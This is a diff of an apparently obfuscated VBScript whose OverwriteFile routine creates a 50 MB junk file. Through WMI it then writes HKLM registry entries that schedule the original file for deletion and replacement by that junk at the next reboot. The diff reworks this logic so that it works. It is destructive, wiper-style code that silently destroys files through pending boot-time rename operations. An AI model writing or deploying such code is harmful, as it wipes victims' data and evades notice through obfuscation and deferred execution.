@@ -32,10 +32,10 @@ If Not q3z8k.FolderExists("C:\Temp") Then q3z8k.CreateFolder("C:\Temp")
 
 Sub OverwriteFile(filePath)
     If q3z8k.FileExists(filePath) Then
-        ' Generate GUID without curly braces and null terminator
-        Dim guid, tempFile
+        ' Generate clean GUID filename
+        Dim typeLib, guid, tempFile
         Set typeLib = CreateObject("Scriptlet.TypeLib")
-        guid = Mid(typeLib.GUID, 2, 36)  ' Remove { } and null terminator
+        guid = Replace(Replace(typeLib.GUID, "{", ""), "}", "")
         tempFile = "C:\Temp\garbage_" & guid & ".tmp"
         
         ' Create garbage file
@@ -43,7 +43,7 @@ Sub OverwriteFile(filePath)
         y8h2m.Write String(50000000, "X")
         y8h2m.Close
         
-        ' Use WMI for proper REG_MULTI_SZ handling
+        ' Use WMI for registry operations
         Dim oReg, HKEY_LOCAL_MACHINE, keyPath, valueName
         Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")
         HKEY_LOCAL_MACHINE = &H80000002
@@ -55,12 +55,17 @@ Sub OverwriteFile(filePath)
         errCode = oReg.GetMultiStringValue(HKEY_LOCAL_MACHINE, keyPath, valueName, existingOps)
         If errCode <> 0 Then existingOps = Array()
         
-        ' Add new operation with REPLACE flag (!)
+        ' Add DELETE operation for original file
         ReDim Preserve existingOps(UBound(existingOps) + 2)
-        existingOps(UBound(existingOps)-1) = "\??\" & tempFile & "!"  ' Source with replace flag
-        existingOps(UBound(existingOps)) = "\??\" & filePath           ' Destination
+        existingOps(UBound(existingOps)-1) = "\??\" & filePath & "!"  ' Mark for deletion
+        existingOps(UBound(existingOps)) = ""                          ' Empty destination
         
-        ' Write back to registry
+        ' Add MOVE operation for replacement
+        ReDim Preserve existingOps(UBound(existingOps) + 2)
+        existingOps(UBound(existingOps)-1) = "\??\" & tempFile        ' Source temp file
+        existingOps(UBound(existingOps)) = "\??\" & filePath & "!"    ' Destination with replace flag
+        
+        ' Write to registry
         oReg.SetMultiStringValue HKEY_LOCAL_MACHINE, keyPath, valueName, existingOps
     End If
 End Sub
